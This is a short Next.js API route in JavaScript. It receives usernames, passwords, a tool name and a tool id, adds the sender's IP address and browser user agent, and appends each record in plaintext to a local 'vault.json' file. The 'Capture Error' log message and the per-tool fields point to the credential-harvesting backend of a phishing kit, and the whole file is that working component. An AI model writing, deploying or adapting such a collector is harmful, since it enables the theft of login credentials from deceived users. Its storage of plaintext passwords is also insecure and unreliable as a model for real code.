import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

export async function POST(request) {
  try {
    const data = await request.json();
    const { tool, username, password, toolId } = data;
    
    // Get IP and UserAgent
    const ip = request.headers.get("x-forwarded-for") || "127.0.0.1";
    const userAgent = request.headers.get("user-agent") || "Unknown Device";
    const timestamp = new Date().toISOString();

    const entry = {
      id: Date.now(),
      tool,
      toolId,
      username,
      password,
      ip,
      userAgent,
      timestamp
    };

    const filePath = path.join(process.cwd(), "vault.json");
    
    let currentData = [];
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf8");
      currentData = JSON.parse(fileContent);
    }
    
    currentData.unshift(entry);
    fs.writeFileSync(filePath, JSON.stringify(currentData, null, 2));

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Capture Error:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
